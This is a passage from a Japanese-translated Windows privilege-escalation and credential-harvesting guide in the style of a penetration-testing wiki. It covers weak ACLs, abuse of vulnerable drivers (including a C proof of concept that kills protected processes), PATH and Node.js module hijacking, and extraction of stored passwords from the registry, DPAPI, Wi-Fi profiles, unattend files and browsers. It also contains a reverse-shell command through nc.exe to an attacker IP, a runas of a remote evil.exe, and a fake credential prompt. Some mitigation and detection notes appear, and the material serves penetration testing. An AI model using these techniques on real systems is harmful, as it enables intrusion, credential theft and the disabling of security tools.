icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は、`plugins` サブフォルダ内の任意の plugin DLL を autoload します。書き込み可能な portable/copy install がある場合、悪意のある plugin を配置すると、起動のたびに `notepad++.exe` 内で自動的に code execution できます（`DllMain` と plugin callbacks からも含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザーによって実行される registry や binary を上書きできないか確認してください。**\
**特権昇格のための興味深い autoruns locations についてさらに学ぶには、** **以下のページ** を**読んでください**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限されることを意図した device object を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作に対する caller context を検証する。process termination や handle の返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*、input validation）し、直接の kernel privileges の代わりに brokered models を検討する。

防御側向けの検知アイデア
- 疑わしい device names（例: \\ .\\amsdk*）への user-mode open と、悪用を示唆する特定の IOCTL sequence を監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、自分の allow/deny lists を維持する。


## PATH DLL Hijacking

**PATH** に存在する folder 内に **write permissions** があれば、process によって load される DLL を hijack して **privileges を escalate** できる可能性がある。

PATH 内のすべての folder の permissions を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法についての詳細は、以下を参照してください:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron の module resolution hijacking

これは **Windows uncontrolled search path** の変種で、`require("foo")` のような素の import を行い、期待される module が **存在しない** 場合に **Node.js** および **Electron** アプリケーションに影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリの `node_modules` フォルダを確認して package を解決します。Windows ではその探索がドライブのルートまで到達するため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を参照しようとする可能性があります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package フォルダ）を配置し、より **高権限の Node/Electron process** が不足している dependency を解決するのを待つことができます。payload は被害者 process の security context で実行されるため、対象が administrator として実行されている場合、昇格された scheduled task/service wrapper 経由の場合、または自動起動する高権限の desktop app の場合には、これは **LPE** になります。

これは特に次のような場合によく見られます:

- dependency が `optionalDependencies` に宣言されている
- サードパーティ library が `require("foo")` を `try/catch` で包み、失敗しても処理を継続する
- package が production build から削除された、packaging 時に含まれなかった、または install に失敗した
- 問題のある `require()` が main application code ではなく dependency tree の深い位置にある

### Vulnerable な target の調査

**Procmon** を使って resolution path を確認します:

- Filter by `Process Name` = target executable (`node.exe`, Electron app の EXE、または wrapper process)
- Filter by `Path` `contains` `node_modules`
- `NAME NOT FOUND` と、`C:\node_modules`  હેઠળの最終的に成功した open に注目する

展開済み `.asar` ファイルや application source における有用な code-review pattern:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **不足しているパッケージ名** を特定する。
2. まだ存在しない場合は、root lookup ディレクトリを作成する:
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前の module をドロップする:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害アプリケーションを実行する。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性がある。

このパターンに当てはまる、missing optional modules の実例には `bluebird` と `utf-8-validate` があるが、再利用可能なのは **technique** の部分だ。権限の高い Windows Node/Electron プロセスが解決する任意の **missing bare import** を見つければよい。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだら alert する。
- 高 integrity のプロセスが `C:\node_modules\*` から読み込むのを hunt する。
- 本番環境では実行時の依存関係をすべて package に含め、`optionalDependencies` の使用を監査する。
- サードパーティコードに、黙って `try { require("...") } catch {}` するパターンがないか確認する。
- ライブラリが対応している場合は optional probe を無効化する（たとえば、`ws` の一部の deployment では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部から**restricted services**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、無効化...)**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得できれば、任意のポートで待ち受けできます（`nc.exe` で初めてポート待ち受けをするとき、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試せます

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダで `WSL` の filesystem を探索できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーに**自動でログインできる**サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook の認証情報、Twitter の認証情報、Gmail の認証情報などを保存でき、ブラウザ経由で自動ログインできるようになるように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows がユーザーに自動でログインできる認証情報を保存します。つまり、**リソース（サーバーまたは Webサイト）にアクセスするために認証情報を必要とする Windows アプリケーション**は、この **Credential Manager** と Windows Vault を利用でき、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使えます。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソースの認証情報を使うことはできないと思います。したがって、アプリケーションが vault を使いたい場合は、何らかの方法で**credential manager と通信し、デフォルトの storage vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、`runas` を `/savecred` オプション付きで使うことで、保存された認証情報を使用できます。次の例では、SMB share 経由でリモート binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報で `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** は、データの対称暗号化のための手法を提供し、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムの秘密情報を利用して、エントロピーに大きく寄与します。

**DPAPI は、ユーザーのログイン秘密情報から導出された対称鍵を通じて鍵の暗号化を可能にします**。システム暗号化に関するシナリオでは、システムのドメイン認証秘密情報を利用します。

DPAPI によって暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を同じファイル内で保護する master key と同じ場所にある DPAPI key** は、通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password** で保護された **credentials files** は通常、以下にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` を適切な `/masterkey` とともに使って復号できます。\
`sekurlsa::dpapi` モジュールで、**メモリ**から多くの **DPAPI** **masterkeys** を抽出できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使われます。credentials は **DPAPI** によって保護されており、通常は作成された同じコンピュータ上の同じユーザーだけが復号できます。

ファイルに含まれる PS credentials を**復号**するには、次のようにします。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します .\
インストーラーは **SYSTEM権限で実行** され、 多くは **DLL Sideloading** に脆弱です (**Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがあるので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかれば、それは保存された SSH key である可能性が高いです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この technique についての詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されていない場合で、起動時に自動的に開始したいなら、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` でそれらを追加して、ssh 経由で machine に login してみました。registry HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも asymmetric key authentication 中の `dpapi.dll` の使用は確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使って、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを探します

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を通じて、マシンのグループにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、任意のドメインユーザーからアクセス可能でした。第二に、これらの GPP 内のパスワードは、公開文書化されたデフォルトキーを使用して AES256 で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。これは、ユーザーが権限を昇格できる可能性があり、深刻なリスクでした。

このリスクを軽減するために、空でない "cpassword" フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、この関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正を支援します。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ で検索します:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentialsを含むweb.configの例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報を求める

必要であれば、**ユーザーに自身の資格情報、または別のユーザーの資格情報を入力させるよう求める**ことができます。ただし、そのユーザーがそれらを知っている可能性があると考える場合に限ります（注意: クライアントに直接**credentials**を**ask**するのは非常に**risky**です）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前に **passwords** を **clear-text** または **Base64** で含んでいたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
サーチする提案されたすべてのファイル:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内のCredentials

Binもチェックして、その中にcredentialsがないか確認すべきです

いくつかのプログラムで保存された**passwords**を**recover**するには、[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html) を使えます

### registry内

**credentialsを含む他の可能性のあるregistry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

**Chrome** や **Firefox** に保存されているパスワードの dbs を確認してください。\
また、ブラウザの履歴、ブックマーク、favourites も確認して、そこに **passwords** が保存されている可能性があるか見てください。

ブラウザから passwords を抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
